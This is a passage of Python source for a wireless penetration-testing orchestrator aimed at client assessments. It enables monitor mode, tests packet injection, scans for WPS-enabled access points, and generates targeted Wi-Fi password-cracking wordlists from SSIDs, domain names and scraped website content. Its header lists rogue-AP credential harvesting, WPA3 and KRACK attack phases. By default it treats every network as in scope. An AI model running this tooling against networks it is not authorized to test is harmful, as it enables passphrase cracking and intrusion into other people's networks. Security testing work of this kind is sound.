#!/usr/bin/env python3
"""
aether.py — Wireless Penetration Testing Orchestrator
======================================================
Orchestrates multi-phase wireless assessments via:
  Phase 0   — WEP IV capture and key cracking           (aircrack-ng suite)
  Phase 1a  — PMKID clientless capture + hashcat crack  (hcxdumptool / hashcat)
  Phase 1b  — WPA/WPA2/WPA3 handshake + WPS             (wifite2)
  Phase 2   — WPA-Enterprise rogue AP / cred harvest    (EAPHammer + asleap)
  Phase 3   — WPA3 SAE cryptographic vulnerability      (dragonslayer)
  Phase 4   — WPA3 SAE resource exhaustion              (dragondrain)
  Phase 5   — WPA2 KRACK key reinstallation testing     (krackattacks-scripts)

Protocol tokens (emitted to stdout for Spectre frontend):
  __SPECTRE_LOG__    <message>
  __SPECTRE_ERR__    <message>
  __SPECTRE_STATUS__ <json>
  __SPECTRE_FINDING__<json>
  __SPECTRE_PROMPT__ <message>

Usage:
  python3 aether.py --config config.json --project my_assessment
  python3 aether.py --phase pmkid --interface wlan1 --project quick_test
  python3 aether.py --list-phases
"""

import argparse
import json
import os
import platform
import re
import select
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from html.parser import HTMLParser as _HTMLParser
from itertools import permutations as _permutations
from pathlib import Path
import hashlib
import hmac
import ipaddress
import queue
import socket
import struct
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

VERSION = "1.6.0"


def _clients_base() -> Path:
    """Return the OS-appropriate default parent directory for client project folders."""
    system = platform.system()
    if system == "Windows":
        base = Path("C:/clients")
    elif system == "Darwin":
        base = Path("/Users/Shared/clients")
    else:
        base = Path("/clients")
    base.mkdir(parents=True, exist_ok=True)
    return base


def _build_project_dir(client_short: str, start_date: str, tool_name: str) -> Path:
    """
    Build a structured project directory:
      <clients_base>/<client_short>/<year>/<tool_name>/<client_short>_<datetime>/
    """
    import re as _re
    slug = _re.sub(r'[^\w-]', '_', (client_short or 'client').strip().lower()).strip('_') or 'client'
    year = (start_date[:4] if start_date and len(start_date) >= 4 and start_date[:4].isdigit()
            else datetime.now().strftime('%Y'))
    dt_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    path = _clients_base() / slug / year / tool_name / f"{slug}_{dt_str}"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _write_project_meta(project_dir: Path, tool: str, client_name: str,
                        client_short: str, year: str, version: str) -> None:
    """Write project_meta.json so Flask apps can discover this project."""
    import json as _json
    try:
        (project_dir / "project_meta.json").write_text(
            _json.dumps({
                "tool":         tool,
                "client_name":  client_name,
                "client_short": client_short,
                "year":         year,
                "created_at":   datetime.now().isoformat(),
                "version":      version,
            }, indent=2),
            encoding="utf-8",
        )
    except Exception:
        pass


# ── Findings catalogue ────────────────────────────────────────────────────────
_catalogue: dict[str, dict] = {}


def _load_catalogue() -> None:
    global _catalogue
    cat_path = Path(__file__).parent / "findings_catalogue.json"
    if cat_path.exists():
        try:
            entries = json.loads(cat_path.read_text(encoding="utf-8"))
            _catalogue = {e["id"]: e for e in entries}
        except Exception:
            pass


# ── In-process findings collector ────────────────────────────────────────────
_findings_collected: list[dict] = []

# ── Output protocol ───────────────────────────────────────────────────────────
_MANAGED = os.environ.get("SPECTRE_MANAGED", "") == "1"
_log_fh = None  # opened in main() once the project dir is known


def _tok(token: str, msg: str) -> None:
    print(f"{token} {msg}", flush=True)
    if _log_fh is not None:
        ts = datetime.now().strftime("%H:%M:%S")
        if token == "__SPECTRE_LOG__":
            _log_fh.write(f"[{ts}] {msg}\n")
        elif token == "__SPECTRE_ERR__":
            _log_fh.write(f"[{ts}] [!] {msg}\n")
        elif token == "__SPECTRE_STATUS__":
            try:
                d = json.loads(msg)
                step = f" — {d['step']}" if d.get("step") else ""
                _log_fh.write(f"[{ts}] [{d.get('status','?').upper()}] "
                              f"{d.get('label', d.get('phase','?'))}{step}\n")
            except Exception:
                pass
        _log_fh.flush()


def log(msg: str)    -> None: _tok("__SPECTRE_LOG__",     msg)
def err(msg: str)    -> None: _tok("__SPECTRE_ERR__",     msg)


def status(phase: str, label: str, state: str, step: str = "") -> None:
    _tok("__SPECTRE_STATUS__", json.dumps({
        "phase": phase, "label": label, "status": state, "step": step,
        "ts": datetime.now().isoformat(),
    }))


def finding(title: str, severity: str, description: str,
            data: dict | None = None, output_file: str = "",
            cvss_score: float | None = None, cvss_vector: str = "") -> None:
    rec = {
        "title": title, "severity": severity, "description": description,
        "data": data or {}, "output_file": output_file,
        "ts": datetime.now().isoformat(),
    }
    if cvss_score is not None:
        rec["cvss_score"]  = cvss_score
        rec["cvss_vector"] = cvss_vector
    _findings_collected.append(rec)
    _tok("__SPECTRE_FINDING__", json.dumps(rec))


def finding_from_cat(cat_id: str, data: dict | None = None,
                     output_file: str = "", title_override: str = "") -> None:
    """Emit a finding using catalogue as authoritative source for all metadata,
    including CVSS score and vector when present in the catalogue entry."""
    entry = _catalogue.get(cat_id, {})
    finding(
        title=title_override or entry.get("title", cat_id),
        severity=entry.get("severity", "HIGH"),
        description=entry.get("description", cat_id),
        data={**(data or {}), "catalogue_id": cat_id,
              "remediation": entry.get("remediation", "")},
        output_file=output_file,
        cvss_score=entry.get("cvss_score"),
        cvss_vector=entry.get("cvss_vector", ""),
    )


def save_findings(output_dir: Path) -> None:
    out = output_dir / "findings_spectre.json"
    out.write_text(json.dumps(_findings_collected, indent=2), encoding="utf-8")
    log(f"Findings written: {out} ({len(_findings_collected)} item(s))")


# ── Subprocess helpers ────────────────────────────────────────────────────────

_ANSI_ESC = re.compile(r'\x1b(?:\[[0-9;?]*[a-zA-Z]|[()][012AB])')

def _strip_ansi(text: str) -> str:
    return _ANSI_ESC.sub('', text)


def _popen(cmd: list, **kwargs) -> subprocess.Popen:
    kwargs.setdefault("stdin", subprocess.DEVNULL)
    return subprocess.Popen(cmd, **kwargs)


def _run(cmd: list, timeout: int = 60) -> tuple[str, int]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, stdin=subprocess.DEVNULL)
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "(timeout)", -1
    except Exception as exc:
        return str(exc), -1


def _kill_proc(proc: subprocess.Popen, wait_secs: int = 5) -> None:
    """SIGTERM then SIGKILL if the process does not exit cleanly."""
    try:
        proc.terminate()
        proc.wait(timeout=wait_secs)
    except subprocess.TimeoutExpired:
        proc.kill()
        try:
            proc.wait(timeout=3)
        except Exception:
            pass
    except Exception:
        pass


def _readline_timed(stdout, deadline: float) -> bytes | None:
    """Read one line from a binary pipe honouring a wall-clock deadline."""
    remaining = deadline - time.time()
    if remaining <= 0:
        return None
    ready, _, _ = select.select([stdout], [], [], remaining)
    if not ready:
        return None
    line = stdout.readline()
    return line if line else None


# ── Scope enforcement ─────────────────────────────────────────────────────────
# Populated from config at startup; empty means "all targets allowed".
_scope_bssids: set[str] = set()
_scope_ssids:  set[str] = set()


def _in_scope(ap: dict) -> bool:
    """Return True if the AP is within the configured assessment scope.
    An empty scope means all APs are in-scope (default behaviour).
    Scope acts as a hard whitelist — any non-listed BSSID or SSID is blocked."""
    if not _scope_bssids and not _scope_ssids:
        return True
    bssid = ap.get("bssid", "").upper()
    ssid  = ap.get("ssid",  "")
    bssid_ok = not _scope_bssids or bssid in _scope_bssids
    ssid_ok  = not _scope_ssids  or ssid  in _scope_ssids
    if not (bssid_ok and ssid_ok):
        log(f"  OUT OF SCOPE — skipping {ssid!r} [{bssid}]")
        return False
    return True


# ── Privilege / pre-flight checks ─────────────────────────────────────────────

def _check_privileges() -> None:
    if os.geteuid() == 0:
        return
    _, rc = _run(["sudo", "-n", "true"], timeout=5)
    if rc != 0:
        err("WARNING: not running as root and passwordless sudo is unavailable. "
            "Wireless operations will fail. Run as root or configure NOPASSWD sudo.")


def _check_interface(interface: str) -> bool:
    sys_net = Path("/sys/class/net")
    if sys_net.exists():
        if (sys_net / interface).exists():
            return True
        available = ", ".join(sorted(p.name for p in sys_net.iterdir()))
        err(f"Interface '{interface}' not found. Available: {available}")
        return False
    _, rc = _run(["ifconfig", interface], timeout=5)
    if rc != 0:
        err(f"Interface '{interface}' not found (ifconfig rc={rc}).")
        return False
    return True


def _check_injection(monitor_iface: str) -> bool:
    """Test packet injection capability using aireplay-ng --test (-9).
    Returns True if injection is confirmed, False if it fails.
    A failed test is a warning, not a hard abort — some tools manage their
    own injection without relying on this test."""
    if not shutil.which("aireplay-ng"):
        log("[~] aireplay-ng not found — skipping injection test")
        return True
    log(f"Testing packet injection on {monitor_iface}...")
    out, rc = _run(["sudo", "aireplay-ng", "-9", monitor_iface], timeout=30)
    if "Injection is working!" in out or rc == 0:
        log(f"  Injection OK on {monitor_iface}")
        return True
    err(f"  Injection test failed on {monitor_iface}. "
        f"Deauthentication and ARP replay attacks may not work.\n{out[:300]}")
    return False


# ── Wordlist helpers ──────────────────────────────────────────────────────────

def _generate_ssid_wordlist(ssid: str, base_wordlist: str | None) -> str | None:
    """Generate a targeted wordlist seeded from the SSID name with common
    password mutations (year suffixes, numeric suffixes, case variants).
    Merges with base_wordlist when provided.
    Returns path to the generated temp file, or None on failure."""
    if not ssid:
        return base_wordlist

    mutations: list[str] = []
    candidates = [ssid, ssid.lower(), ssid.upper(), ssid.capitalize()]
    suffixes   = (
        [""] +
        [str(y) for y in range(2019, 2027)] +       # year variants
        ["!", "@", "#", "123", "1234", "12345",
         "0", "01", "001", "wifi", "pass", "admin"]
    )
    for base in candidates:
        for sfx in suffixes:
            w = base + sfx
            if 8 <= len(w) <= 63:   # WPA passphrase length bounds
                mutations.append(w)
        # Reversed
        rev = base[::-1]
        if 8 <= len(rev) <= 63:
            mutations.append(rev)

    seen: set[str] = set()
    deduped = [w for w in mutations if not (w in seen or seen.add(w))]  # type: ignore[func-returns-value]

    try:
        tmp = tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", delete=False, encoding="utf-8"
        )
        # SSID-derived mutations first (highest probability)
        for w in deduped:
            tmp.write(w + "\n")
        # Append base wordlist lines
        if base_wordlist and os.path.exists(base_wordlist):
            with open(base_wordlist, encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.rstrip("\n")
                    if 8 <= len(line) <= 63 and line not in seen:
                        tmp.write(line + "\n")
        tmp.close()
        log(f"  SSID wordlist: {len(deduped)} mutations + base → {tmp.name}")
        return tmp.name
    except Exception as exc:
        err(f"SSID wordlist generation failed: {exc}")
        return base_wordlist


def _build_domain_wordlist(domains: list[str], base_wordlist: str | None) -> str | None:
    """Build a targeted wordlist from provided domain names.

    Parsing  — strips TLDs/ccTLDs, splits on '.', '-', '_', and numeric
               boundaries to extract meaningful word components.
    Mutations— per-word: lowercase, UPPERCASE, Capitalize, CamelCase, l33t.
    Combos   — pairs of component words joined with common separators and
               year/symbol suffixes.
    Perms    — all orderings of the word set (capped at 4 words).
    All candidates are deduplicated and filtered to WPA passphrase length
    bounds (8–63 chars).  Returns path to a temp file, or base_wordlist when
    no domains are supplied.
    """
    if not domains:
        return base_wordlist

    _STRIP_SUFFIXES = {
        "com", "net", "org", "edu", "gov", "mil", "int", "co", "io", "ai",
        "info", "biz", "us", "uk", "ca", "au", "de", "fr", "jp", "cn",
        "tech", "app", "dev", "cloud", "online", "site", "web", "store",
        "shop", "blog", "news", "mail", "email",
    }

    raw_words: list[str] = []
    for domain in domains:
        domain = re.sub(r'^https?://', '', domain)
        labels = domain.lower().split('.')
        filtered = [lb for lb in labels if lb and lb not in _STRIP_SUFFIXES]
        for label in filtered:
            for part in re.split(r'[-_]', label):
                for sp in re.split(r'(\d+)', part):
                    if sp:
                        raw_words.append(sp)

    if not raw_words:
        return base_wordlist

    # Deduplicate component words preserving order
    seen_w: set[str] = set()
    unique_words: list[str] = []
    for w in raw_words:
        wl = w.lower()
        if wl and wl not in seen_w:
            seen_w.add(wl)
            unique_words.append(wl)

    def _mutations(word: str) -> list[str]:
        cap   = word[0].upper() + word[1:] if len(word) > 1 else word.upper()
        l33t  = (word.replace('a', '@').replace('e', '3')
                     .replace('i', '1').replace('o', '0').replace('s', '$'))
        variants = [word, word.lower(), word.upper(), word.capitalize(),
                    cap, l33t]
        # camelCase with next word handled at combination step; single-word
        # title is same as capitalize — skip duplicate
        return list(dict.fromkeys(v for v in variants if v))

    _sfx = (
        [""] +
        [str(y) for y in range(2019, 2027)] +
        ["!", "@", "#", "1", "12", "123", "1234", "12345",
         "0", "01", "001", "pass", "wifi", "admin", "key",
         "vpn", "wlan", "net", "2.4", "5g", "5ghz"]
    )
    _seps = ["", "-", "_", ".", "@", "!", "1", "123"]

    seen: set[str] = set()
    candidates: list[str] = []

    def _add(w: str) -> None:
        if w and w not in seen and 8 <= len(w) <= 63:
            seen.add(w)
            candidates.append(w)

    # Single-word mutations + suffixes
    for base in unique_words:
        for mut in _mutations(base):
            for sfx in _sfx:
                _add(mut + sfx)
                if sfx:
                    _add(sfx + mut)

    # Pairwise combinations (cap at 8 unique words to avoid explosion)
    capped = unique_words[:8]
    if len(capped) >= 2:
        for i, w1 in enumerate(capped):
            for w2 in capped:
                if w1 == w2:
                    continue
                for m1 in _mutations(w1)[:3]:
                    for m2 in _mutations(w2)[:3]:
                        for sep in _seps:
                            _add(m1 + sep + m2)
                            for sfx in ["", "!", "1", "123"]:
                                _add(m1 + sep + m2 + sfx)

    # Permutations of up to 4 words (up to 4! = 24 orderings)
    perm_src = capped[:4]
    if len(perm_src) >= 2:
        for r in range(2, len(perm_src) + 1):
            for perm in _permutations(perm_src, r):
                joined = "".join(perm)
                _add(joined)
                for sep in ["-", "_", "."]:
                    _add(sep.join(perm))
                for sfx in ["", "!", "1", "123"]:
                    _add(joined + sfx)

    try:
        tmp = tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", delete=False, encoding="utf-8"
        )
        for w in candidates:
            tmp.write(w + "\n")
        if base_wordlist and os.path.exists(base_wordlist):
            with open(base_wordlist, encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.rstrip("\n")
                    if 8 <= len(line) <= 63 and line not in seen:
                        seen.add(line)
                        tmp.write(line + "\n")
        tmp.close()
        log(f"  Domain wordlist: {len(candidates)} entries from "
            f"{len(domains)} domain(s) → {tmp.name}")
        return tmp.name
    except Exception as exc:
        err(f"Domain wordlist generation failed: {exc}")
        return base_wordlist


# ── Website wordlist builder ──────────────────────────────────────────────────

_STOP_WORDS: frozenset = frozenset({
    "a", "an", "the", "and", "or", "but", "if", "in", "on", "at", "to",
    "for", "of", "with", "by", "from", "up", "about", "into", "through",
    "is", "are", "was", "were", "be", "been", "being", "have", "has", "had",
    "do", "does", "did", "will", "would", "could", "should", "may", "might",
    "can", "this", "that", "these", "those", "it", "its", "we", "you", "he",
    "she", "they", "them", "their", "our", "your", "my", "his", "her", "all",
    "as", "so", "no", "not", "also", "than", "then", "when", "where", "who",
    "which", "what", "how", "why", "more", "most", "some", "any", "each",
    "both", "few", "other", "such", "very", "just", "new", "one", "two",
    "three", "four", "five", "six", "seven", "eight", "nine", "ten",
    "get", "got", "use", "used", "using", "see", "make", "made", "go",
    "come", "back", "first", "last", "only", "same", "good", "much",
    "i", "me", "us", "www", "http", "https", "html", "css", "php",
})

_MONTH_ABBRV = ("", "Jan", "Feb", "Mar", "Apr", "May", "Jun",
                "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")
_MONTH_NAMES = ("", "January", "February", "March", "April", "May", "June",
                "July", "August", "September", "October", "November", "December")
_MONTH_MAP = {
    "january":1,  "jan":1,  "february":2, "feb":2,  "march":3,   "mar":3,
    "april":4,    "apr":4,  "may":5,       "june":6, "jun":6,     "july":7,
    "jul":7,      "august":8,"aug":8,      "september":9, "sep":9, "sept":9,
    "october":10, "oct":10, "november":11, "nov":11, "december":12,"dec":12,
}


def _expand_date(year: int, month: int, day: int) -> set:
    """Return a set of password-style strings representing a calendar date."""
    yy   = f"{year % 100:02d}"
    yyyy = f"{year:04d}"
    mm   = f"{month:02d}"
    dd   = f"{day:02d}"
    mn   = _MONTH_ABBRV[month]
    mf   = _MONTH_NAMES[month]
    return {
        f"{dd}{mm}{yy}", f"{dd}{mm}{yyyy}",
        f"{mm}{dd}{yy}", f"{mm}{dd}{yyyy}",
        f"{yyyy}{mm}{dd}", f"{yy}{mm}{dd}",
        f"{dd}-{mm}-{yy}", f"{dd}/{mm}/{yyyy}",
        f"{mm}-{dd}-{yy}", f"{mm}/{dd}/{yyyy}",
        f"{yyyy}-{mm}-{dd}",
        f"{mn}{dd}", f"{mn}{yy}", f"{mn}{yyyy}",
        f"{mn}{dd}{yy}", f"{mn}{dd}{yyyy}",
        f"{dd}{mn}", f"{dd}{mn}{yy}", f"{dd}{mn}{yyyy}",
        f"{mf}{dd}", f"{mf}{yyyy}", f"{mf}{dd}{yyyy}",
        yyyy, yy, dd, mm,
    }


def _detect_dates(text: str) -> list:
    """Find date patterns in text; return list of (year, month, day) tuples."""
    results = []
    # ISO: 2026-05-19 or 2026/05/19
    for m in re.finditer(r'\b((?:19|20)\d{2})[-/](\d{1,2})[-/](\d{1,2})\b', text):
        try:
            y, mo, d = int(m.group(1)), int(m.group(2)), int(m.group(3))
            if 1 <= mo <= 12 and 1 <= d <= 31:
                results.append((y, mo, d))
        except ValueError:
            pass
    # US short: 05/19/2026 or 5-19-26
    for m in re.finditer(r'\b(\d{1,2})[-/](\d{1,2})[-/]((?:19|20)?\d{2})\b', text):
        try:
            mo, d, y = int(m.group(1)), int(m.group(2)), int(m.group(3))
            if y < 100:
                y += 2000
            if 1 <= mo <= 12 and 1 <= d <= 31 and 1900 <= y <= 2050:
                results.append((y, mo, d))
        except ValueError:
            pass
    # Written: "May 19, 2026" or "19 May 2026"
    _mp = (r'(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?'
           r'|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)')
    for m in re.finditer(rf'\b({_mp})\s+(\d{{1,2}})(?:st|nd|rd|th)?,?\s+((?:19|20)\d{{2}})\b',
                         text, re.IGNORECASE):
        mo = _MONTH_MAP.get(m.group(1).lower()[:3])
        if mo:
            try:
                results.append((int(m.group(3)), mo, int(m.group(2))))
            except ValueError:
                pass
    for m in re.finditer(rf'\b(\d{{1,2}})(?:st|nd|rd|th)?\s+({_mp})\s+((?:19|20)\d{{2}})\b',
                         text, re.IGNORECASE):
        mo = _MONTH_MAP.get(m.group(2).lower()[:3])
        if mo:
            try:
                results.append((int(m.group(3)), mo, int(m.group(1))))
            except ValueError:
                pass
    return list({(y, mo, d) for y, mo, d in results if 1900 <= y <= 2050})


class _TextLinkParser(_HTMLParser):
    """Single-pass HTML parser that extracts visible text and same-domain hrefs."""
    _SKIP_TAGS: frozenset = frozenset({
        "script", "style", "noscript", "svg", "path", "head",
        "code", "pre", "iframe", "object", "embed",
    })

    def __init__(self, base_url: str) -> None:
        super().__init__(convert_charrefs=True)
        self._skip: int = 0
        self._base = base_url
        self._base_parsed = urllib.parse.urlparse(base_url)
        self.texts: list = []
        self.links: set = set()

    def handle_starttag(self, tag: str, attrs) -> None:
        if tag in self._SKIP_TAGS:
            self._skip += 1
        amap = dict(attrs)
        for attr in ("alt", "title", "placeholder", "aria-label"):
            if amap.get(attr):
                self.texts.append(amap[attr])
        href = amap.get("href", "")
        if href and not href.startswith(("#", "javascript:", "mailto:", "tel:")):
            abs_url = urllib.parse.urljoin(self._base, href)
            p = urllib.parse.urlparse(abs_url)
            if (p.netloc == self._base_parsed.netloc
                    and p.scheme in ("http", "https")):
                self.links.add(urllib.parse.urlunparse(
                    (p.scheme, p.netloc, p.path, "", "", "")))

    def handle_endtag(self, tag: str) -> None:
        if tag in self._SKIP_TAGS:
            self._skip = max(0, self._skip - 1)

    def handle_data(self, data: str) -> None:
        if self._skip == 0 and data.strip():
            self.texts.append(data)


def _scrape_site(url: str, max_depth: int, max_pages: int = 80) -> tuple:
    """Crawl url up to max_depth levels within the same domain.
    Returns (word_set: set[str], dates: list[tuple]).
    """
    visited: set = set()
    queue: list = [(url.rstrip("/"), 0)]
    all_texts: list = []

    while queue and len(visited) < max_pages:
        cur, depth = queue.pop(0)
        if cur in visited:
            continue
        visited.add(cur)
        log(f"  [scrape] {cur} (depth {depth})")
        try:
            req = urllib.request.Request(
                cur,
                headers={"User-Agent": "pr0t31n-wordlist/1.0 (+assessment)"},
            )
            with urllib.request.urlopen(req, timeout=12) as resp:
                ct = resp.headers.get("Content-Type", "")
                if "text/html" not in ct:
                    continue
                body = resp.read(1_500_000).decode("utf-8", errors="replace")
        except Exception as exc:
            err(f"  [scrape] {cur}: {exc}")
            continue

        parser = _TextLinkParser(cur)
        try:
            parser.feed(body)
        except Exception:
            pass
        all_texts.extend(parser.texts)

        if depth < max_depth:
            for link in parser.links:
                if link not in visited:
                    queue.append((link, depth + 1))

    log(f"  [scrape] Crawled {len(visited)} page(s)")
    joined = " ".join(all_texts)

    words: set = set()
    for raw in re.findall(r"[a-zA-Z][a-zA-Z0-9]{2,}", joined):
        w = raw.lower()
        if len(w) >= 3 and w not in _STOP_WORDS:
            words.add(w)

    dates = _detect_dates(joined)
    return words, dates


def _build_website_wordlist(url: str, max_depth: int,
                             base_wordlist: str | None) -> str | None:
    """Crawl a website and build a password-candidate wordlist from its content.

    Words are extracted from all visible text, filtered for stop words,
    then expanded via case mutations, date representations, pairwise
    combinations (sep variants), and 3-word permutations.  The result is
    written to a temp file that extends base_wordlist.
    """
    if not url:
        return base_wordlist

    log(f"Website wordlist: scraping {url} (max depth {max_depth})…")
    try:
        words, dates = _scrape_site(url, max(1, min(7, max_depth)))
    except Exception as exc:
        err(f"Website scrape error: {exc}")
        return base_wordlist

    if not words:
        log("  [scrape] No usable words extracted")
        return base_wordlist

    log(f"  [scrape] {len(words)} unique words, {len(dates)} date(s)")

    seen: set = set()
    candidates: list = []

    def _add(w: str) -> None:
        if w and w not in seen and 8 <= len(w) <= 63:
            seen.add(w)
            candidates.append(w)

    # Single-word mutations
    word_list = sorted(words)
    for w in word_list:
        for v in (w, w.capitalize(), w.upper()):
            _add(v)

    # Date expansions
    date_strs: set = set()
    for (y, mo, d) in dates:
        date_strs.update(_expand_date(y, mo, d))
    for ds in date_strs:
        _add(ds)
        for sfx in ("!", "@", "1", "123"):
            _add(ds + sfx)

    # Words + dates
    for w in word_list[:40]:
        for ds in list(date_strs)[:25]:
            _add(w + ds)
            _add(w.capitalize() + ds)
            _add(ds + w)

    # Pairwise combinations
    cap2 = word_list[:50]
    seps = ("", "-", "_", ".")
    for i, w1 in enumerate(cap2):
        for w2 in cap2:
            if w1 >= w2:
                continue
            for sep in seps:
                _add(w1 + sep + w2)
                _add(w1.capitalize() + sep + w2.capitalize())
                _add(w2 + sep + w1)
        if i >= 29:
            break

    # 3-word permutations (tightly capped to avoid explosion)
    cap3 = word_list[:20]
    for i, w1 in enumerate(cap3):
        for j, w2 in enumerate(cap3):
            if j <= i:
                continue
            for w3 in cap3:
                if w3 in (w1, w2):
                    continue
                _add(w1 + w2 + w3)
                _add(w1.capitalize() + w2.capitalize() + w3.capitalize())
                _add(w1 + "-" + w2 + "-" + w3)

    log(f"  Website wordlist: {len(candidates)} candidate passwords")

    try:
        tmp = tempfile.NamedTemporaryFile(
            mode="w", suffix="-web.txt", delete=False, encoding="utf-8",
        )
        for w in candidates:
            tmp.write(w + "\n")
        if base_wordlist and os.path.exists(base_wordlist):
            with open(base_wordlist, encoding="utf-8", errors="replace") as bf:
                for line in bf:
                    line = line.rstrip("\n")
                    if 8 <= len(line) <= 63 and line not in seen:
                        seen.add(line)
                        tmp.write(line + "\n")
        tmp.close()
        log(f"  Website wordlist saved → {tmp.name}")
        return tmp.name
    except Exception as exc:
        err(f"Website wordlist write failed: {exc}")
        return base_wordlist


# ── Monitor mode management ───────────────────────────────────────────────────

def enable_monitor_mode(interface: str, monitor_iface: str) -> str:
    log(f"Enabling monitor mode on {interface}...")
    sys_net = Path("/sys/class/net")

    def _net_ifaces() -> set:
        return {p.name for p in sys_net.iterdir()} if sys_net.exists() else set()

    def _is_monitor(name: str) -> bool:
        try:
            return (sys_net / name / "type").read_text().strip() == "803"
        except Exception:
            return False

    if shutil.which("airmon-ng"):
        pre = _net_ifaces()
        _run(["sudo", "airmon-ng", "check", "kill"])
        out, _ = _run(["sudo", "airmon-ng", "start", interface])
        time.sleep(2)
        post = _net_ifaces()

        # Primary: newly-appeared interface confirmed in monitor mode via sysfs
        for name in sorted(post - pre):
            if _is_monitor(name):
                log(f"Monitor mode enabled: {name}")
                return name

        # Secondary: existing interface converted to monitor mode in-place
        for name in sorted(post):
            if name != interface and _is_monitor(name):
                log(f"Monitor mode enabled: {name}")
                return name

        # Tertiary: regex on airmon-ng output — require leading alpha to reject
        # bare numbers (e.g. "10") that some airmon-ng versions emit
        for pattern in (
            r'enabled\s+(?:for|on)\s+(?:\[[^\]]*\])?\S+\s+on\s+(?:\[[^\]]*\])?([a-zA-Z]\w*)',
            r'enabled\s+(?:for|on)\s+(?:\[[^\]]*\])?([a-zA-Z]\w*)',
        ):
            m = re.search(pattern, out, re.I)
            if m:
                detected = m.group(1).strip()
                log(f"Monitor mode enabled: {detected}")
                return detected

        log(f"Monitor mode started — using configured name {monitor_iface}")
        return monitor_iface

    _run(["sudo", "ip", "link", "set", interface, "down"])
    _run(["sudo", "iw", interface, "set", "monitor", "none"])
    _run(["sudo", "ip", "link", "set", interface, "up"])
    log(f"Monitor mode set via iw on {interface}")
    return interface


def disable_monitor_mode(monitor_iface: str, original_iface: str) -> None:
    # Step 1: tear down the monitor interface
    if shutil.which("airmon-ng"):
        _run(["sudo", "airmon-ng", "stop", monitor_iface], timeout=15)
    else:
        _run(["sudo", "ip", "link", "set", monitor_iface, "down"], timeout=5)
        _run(["sudo", "iw", monitor_iface, "set", "type", "managed"], timeout=5)
        _run(["sudo", "ip", "link", "set", monitor_iface, "up"], timeout=5)

    # Step 2: explicitly restore the original physical interface to managed mode.
    # airmon-ng stop removes the monitor vif but does not reset the underlying
    # PHY — wlan0 is left down and the driver still thinks it is in monitor mode.
    # Do this unconditionally; failures (e.g. interface already gone) are benign.
    if original_iface and original_iface != monitor_iface:
        _run(["sudo", "ip", "link", "set", original_iface, "down"], timeout=5)
        if shutil.which("iw"):
            _run(["sudo", "iw", original_iface, "set", "type", "managed"], timeout=5)
        elif shutil.which("iwconfig"):
            _run(["sudo", "iwconfig", original_iface, "mode", "managed"], timeout=5)
        _run(["sudo", "ip", "link", "set", original_iface, "up"], timeout=5)

    # Step 3: restart NetworkManager so it re-acquires the interface.
    # Do NOT also restart wpa_supplicant separately — NetworkManager manages
    # its own wpa_supplicant instance; a standalone restart races against NM
    # and leaves the interface unmanaged.
    if sys.platform.startswith("linux"):
        if shutil.which("systemctl"):
            _run(["sudo", "systemctl", "restart", "NetworkManager"], timeout=20)
        elif shutil.which("service"):
            _run(["sudo", "service", "NetworkManager", "restart"], timeout=20)
    log(f"Monitor mode disabled — {original_iface} restored to managed mode")


# ── WPS detection ─────────────────────────────────────────────────────────────

def _detect_wps(monitor_iface: str, timeout: int = 20) -> set[str]:
    """Run wash to enumerate WPS-enabled APs. Returns set of uppercase BSSIDs."""
    if not shutil.which("wash"):
        return set()
    log(f"WPS scan (wash) on {monitor_iface} for {timeout}s...")
    wps_bssids: set[str] = set()
    proc = None
    try:
        proc = _popen(
            ["sudo", "wash", "-i", monitor_iface, "-C"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
        )
        if proc.stdout is None:
            return wps_bssids
        deadline = time.time() + timeout
        while True:
            line = _readline_timed(proc.stdout, deadline)
            if line is None:
                break
            decoded = line.decode("utf-8", errors="replace").strip()
            # wash output columns: BSSID  Ch  dBm  WPS  Lck  Vendor  ESSID
            m = re.match(r'^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', decoded)
            if m:
                wps_bssids.add(m.group(1).upper())
    except Exception:
        pass
    finally:
        if proc is not None:
            _kill_proc(proc)
    return wps_bssids


# ── Target AP scanning ────────────────────────────────────────────────────────

def scan_targets(
    monitor_iface: str,
    target_ssids: list,
    target_bssids: list | None = None,
    timeout: int = 30,
    channel: int | None = None,
) -> list[dict]:
    """
    Passive AP scan (airodump-ng preferred, iwlist fallback) combined with
    parallel WPS enumeration (wash).
    Returns list of {ssid, bssid, channel, encryption, wps} dicts.
    Emits findings for: open networks, WPS-enabled APs, WPA3-Transition mode.

    NOTE: Hidden SSIDs require active probing (mdk4 probe mode or directed
    wpa_supplicant probe requests) — not implemented here; this scan is passive.
    """
    target_bssids = target_bssids or []
    log(f"Scanning for wireless networks (timeout={timeout}s)...")

    # Run WPS detection in parallel (background — does not block AP scan)
    wps_proc    = None
    wps_bssids: set[str] = set()
    if shutil.which("wash"):
        try:
            wps_proc = _popen(
                ["sudo", "wash", "-i", monitor_iface, "-C"],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            )
        except Exception:
            pass

    discovered: list[dict] = []

    if shutil.which("airodump-ng"):
        import tempfile as _tempfile
        with _tempfile.TemporaryDirectory() as tmp:
            out_prefix = os.path.join(tmp, "scan")
            cmd = [
                "sudo", "airodump-ng",
                "--write", out_prefix, "--output-format", "csv",
            ]
            if channel:
                cmd += ["--channel", str(channel)]
            else:
                cmd += ["--band", "abg"]
            cmd += [monitor_iface]
            proc = None
            try:
                proc = _popen(cmd, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)
                time.sleep(timeout)
            except Exception:
                pass
            finally:
                if proc is not None:
                    _kill_proc(proc)

            csv_file = out_prefix + "-01.csv"
            if os.path.exists(csv_file):
                try:
